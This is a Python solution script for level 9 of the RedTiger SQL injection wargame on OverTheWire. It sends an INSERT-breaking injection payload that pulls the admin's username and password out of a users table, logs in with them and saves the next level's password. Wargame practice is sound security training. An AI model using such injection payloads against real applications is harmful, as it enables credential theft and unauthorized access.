#!/usr/bin/env python3
import pickle
import tigers as tg
from bs4 import BeautifulSoup
import re


def main():
    '''
    Target: Get the password of the admin.
    '''
    base_name = 'level9_users'
    url = "https://redtiger.labs.overthewire.org/level9.php"
    finds = ['username', 'password']  # What we are finding
    pass_r = 'The password for the next level is: '

    try:
        with open('cooks.pickle', 'rb') as f:
            cooks = pickle.load(f)
        if 'level9login' not in cooks:
            print('use prevision level')
            exit(1)
    except:
        print('use level 1')
        exit(1)

    cook = dict(level9login=cooks['level9login'])

    # Payload
    data = dict(autor='', title='',
                text="'), ((select username from level9_users limit 1), (select password from level9_users limit 1),'", post='Submit Query')
    response = tg.get_request(url, data, cook, method='post')

    print(response)

    soup = BeautifulSoup(response, 'html.parser')
    autor = soup.find_all(string=re.compile(
        "Autor:"))[-1].replace('Autor: ', '')
    title = soup.find_all(string=re.compile(
        "Title:"))[-2].replace('Title: ', '')
    print(autor, title)

    # Authorization
    data = dict(user=autor, password=title, login='Login')
    response = tg.get_request(url, data, cook, method='post')

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)

    # Save cookie
    if ('level10login' not in cooks) or (cooks['level10login'] != passw):
        cooks['level10login'] = passw
        tg.save_cookies(cooks)


if __name__ == '__main__':
    main()
